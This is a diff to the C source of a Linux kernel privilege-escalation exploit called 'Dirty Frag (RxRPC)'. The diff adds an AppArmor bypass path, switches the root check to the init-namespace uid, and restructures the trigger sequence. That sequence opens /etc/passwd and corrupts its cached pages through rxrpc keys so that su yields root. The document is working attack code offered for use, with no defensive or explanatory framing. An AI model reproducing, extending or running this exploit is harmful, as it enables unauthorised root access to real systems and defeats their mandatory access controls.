@@ -54,6 +54,7 @@
 
 #include "dirtyfrag_rxrpc.h"
 #include "fcrypt.h"
+#include "apparmor_bypass.h"
 
 #include <fcntl.h>
 #include <pwd.h>
@@ -732,8 +733,8 @@ df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
 {
     log_step("Dirty Frag (RxRPC) — exploit");
 
-    if (getuid() == 0) {
-        log_warn("already root — nothing to escalate");
+    if (real_uid_for_target() == 0) {
+        log_warn("already root in init namespace — nothing to escalate");
         return DF_OK;
     }
 
@@ -826,33 +827,49 @@ df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
      * afterwards must inherit the real uid in the *parent* namespace
      * so PAM can resolve /etc/shadow. So child = triggers, parent = su.
      */
-    pid_t child = fork();
-    if (child < 0) { log_bad("fork: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
-    if (child == 0) {
-        if (!setup_userns(getuid(), getgid())) _exit(1);
-
-        /* Autoload rxrpc.ko by opening a dummy AF_RXRPC socket — the
-         * first add_key("rxrpc", ...) needs it. */
+    if (apparmor_bypass_was_armed()) {
+        log_step("AA bypass already armed — skipping inner fork+unshare (rxrpc)");
+        /* Autoload rxrpc.ko by opening a dummy AF_RXRPC socket. */
         int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
         if (dummy >= 0) close(dummy);
 
         int t = open("/etc/passwd", O_RDONLY);
-        if (t < 0) _exit(2);
+        if (t < 0) { log_bad("open passwd: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
 
-        if (!do_one_trigger(t, 4, Ka)) _exit(3);
-        if (!do_one_trigger(t, 6, Kb)) _exit(4);
-        if (!do_one_trigger(t, 8, Kc)) _exit(5);
-
+        bool ok = do_one_trigger(t, 4, Ka)
+               && do_one_trigger(t, 6, Kb)
+               && do_one_trigger(t, 8, Kc);
         close(t);
-        _exit(0);
-    }
+        if (!ok) return DF_EXPLOIT_FAIL;
+    } else {
+        pid_t child = fork();
+        if (child < 0) { log_bad("fork: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
+        if (child == 0) {
+            if (!setup_userns(getuid(), getgid())) _exit(1);
 
-    int wstat = 0;
-    waitpid(child, &wstat, 0);
-    if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
-        log_bad("child failed (exit %d)",
-                WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
-        return DF_EXPLOIT_FAIL;
+            /* Autoload rxrpc.ko by opening a dummy AF_RXRPC socket — the
+             * first add_key("rxrpc", ...) needs it. */
+            int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+            if (dummy >= 0) close(dummy);
+
+            int t = open("/etc/passwd", O_RDONLY);
+            if (t < 0) _exit(2);
+
+            if (!do_one_trigger(t, 4, Ka)) _exit(3);
+            if (!do_one_trigger(t, 6, Kb)) _exit(4);
+            if (!do_one_trigger(t, 8, Kc)) _exit(5);
+
+            close(t);
+            _exit(0);
+        }
+
+        int wstat = 0;
+        waitpid(child, &wstat, 0);
+        if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
+            log_bad("child failed (exit %d)",
+                    WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
+            return DF_EXPLOIT_FAIL;
+        }
     }
 
     /* Verify in the parent namespace's page cache. */
